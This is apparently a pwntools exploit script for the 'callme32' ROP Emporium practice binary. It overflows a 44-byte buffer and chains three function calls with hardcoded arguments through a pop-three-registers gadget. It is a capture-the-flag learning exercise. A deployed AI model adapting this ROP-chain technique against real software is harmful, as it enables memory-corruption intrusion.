from pwn import *
import os

script_dir = os.path.dirname(os.path.realpath(__file__))
bin = os.path.join(script_dir, 'callme32')

elf = context.binary =  ELF(bin, checksec=False)
context.log_level = 'debug'

gdbscript = '''
init-pwndbg
break pwnme
continue
'''.format(**locals())

if args.GDB:  # Set GDBscript above
    io = gdb.debug(bin, gdbscript=gdbscript)
else:  # Run locally
    io = process()


# Found with GDB
offset = 44
gadget_pop_3 = 0x080487f9
callme_one = 0x080484f0
callme_two = 0x08048550
callme_three = 0x080484e0
arg1 = 0xdeadbeef
arg2 = 0xcafebabe
arg3 = 0xd00df00d

payload = flat(
    "a"*offset,
    callme_one,
    gadget_pop_3,
    arg1,
    arg2,
    arg3,
    callme_two,
    gadget_pop_3,
    arg1,
    arg2,
    arg3,
    callme_three,
    gadget_pop_3,
    arg1,
    arg2,
    arg3,
    "CCCC"
)
# this payload is nice because it shows exactly how the stack will look like after we our input
pprint(payload)

io.sendlineafter(b'>', payload)

io.interactive()
